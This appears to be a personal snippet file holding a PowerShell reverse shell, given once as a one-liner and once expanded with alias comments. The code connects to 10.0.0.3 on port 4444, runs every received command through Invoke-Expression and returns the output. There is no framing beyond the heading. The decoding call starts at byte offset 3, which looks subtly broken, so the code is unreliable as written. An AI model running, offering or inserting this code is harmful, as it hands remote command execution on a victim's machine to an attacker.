#reverseshell
#cmd:powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|ForEach-Object{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data =  (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,3, $i);$sendback =(Invoke-Expression $data 2>&1 | Out-String );$sendback2= $sendback + 'PS '+ (Get-Location).path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"

$client = New-Object System.Net.Sockets.TCPClient('10.0.0.3',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|ForEach-Object{0};                        #ForEach-Object=%
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data =  (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,3, $i);
    $sendback =(Invoke-Expression $data 2>&1 | Out-String );        #Invoke-Expression=iex
    $sendback2= $sendback + 'PS '+ (Get-Location).path + '>';       #Get-Location=pwd
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close()
